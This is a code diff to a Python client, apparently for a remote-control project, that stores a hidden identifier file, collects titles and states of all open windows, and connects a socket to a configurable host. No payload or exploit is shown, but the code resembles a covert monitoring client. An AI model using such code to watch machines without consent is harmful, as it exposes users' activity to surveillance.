@@ -81,50 +81,63 @@ def get_comp_info():
 
 
 def generate_uuid():
-    # 得到本机在控制网络中的uuid，其实建议与服务器通信得到该uuid，之后再改
-    uuid_file_path = os.path.join(os.path.expanduser("~"), "Zeus_UUID.ini")
-    cid = str(uuid.uuid4())
+    # 获取 UUID 文件路径
+    uuid_file_path = os.path.join(os.path.expanduser("~"), "Argus_UUID.ini")
+
+    # 尝试读取已有的 UUID
     if os.path.exists(uuid_file_path):
         with open(uuid_file_path, 'r') as f:
             cid = f.read()
-            print("The UUID Exists.")
-            return str(cid)
+            print("The UUID exists.")
     else:
+        # 生成新的 UUID 并写入文件
+        cid = str(uuid.uuid4())
         with open(uuid_file_path, 'w') as f:
             f.write(cid)
-            print("Create UUID Successfully.")
             os.chmod(uuid_file_path, 0o600)
             win32api.SetFileAttributes(uuid_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
-            return str(cid)
+            print("UUID created successfully.")
+
+    return cid
 
 
 def get_all_windows():
-    f_windows = gw.getAllWindows()
-    return f_windows
+    window_collection = []
+    all_windows = gw.getAllWindows()
+
+    for window in all_windows:
+        window_info = {
+            "Window title": window.title,
+            "Visibility": window.visible,
+            "Height": window.height,
+            "Width": window.width,
+            "Is Minimized": window.isMinimized,
+            "Is Maximized": window.isMaximized,
+            "Is Active": window.isActive
+        }
+        window_collection.append(window_info)
+
+    return window_collection
 
 
-def initialize_socket(host, port):
+def initialize_socket(target_host, target_port):
     try:
-        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sk.connect((host, port))
-        return sk
+        socket_instance = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socket_instance.connect((target_host, target_port))
+        return socket_instance
     except ConnectionRefusedError:
-        # 该情况是由于目标计算机没有打开端口导致
-        print("由于目标计算机积极拒绝，无法连接。")
-        return None
+        print("Connection refused by the target computer.")
     except socket.gaierror:
-        # 地址解析错误处理，出现这个错误说明IP不符合IPV4规范，或者因为其它原因无法解析。
-        print("无效的服务器地址。")
-        return "Invalid IP."
+        print("Invalid server address.")
     except KeyboardInterrupt:
-        print("User Ended The Connection.(in initializing)")
-        socket.close()
+        print("User interrupted the connection initialization.")
+        if socket_instance:
+            socket_instance.close()
     except socket.error:
-        print("Socket 对象创建失败。")
+        print("Failed to create a socket object.")
     except Exception as e:
-        # 其他异常处理，我也不知道会有什么问题
-        print(f"连接出错: {str(e)}")
-        socket.close()
+        print(f"Connection error: {str(e)}")
+    return None
 
 
 def get_info(client_socket):
@@ -268,13 +281,5 @@ if __name__ == "__main__":
     #     print("User Ended The Connection.Global.")
     # except Exception as e:
     #     print("Error, code:" + str(e))
-    windows = get_all_windows()
-    print(windows)
-    for window in windows:
-        print(f"Window title: {window.title}, "
-              f"Visibility: {window.visible}, "
-              f"Height: {window.height}, "
-              f"width: {window.width},"
-              f"isMinimized: {window.isMinimized}, "
-              f"isMaximized: {window.isMaximized}, "
-              f"isActive: {window.isActive}")
+    print(get_comp_info())
+    print(get_all_windows())
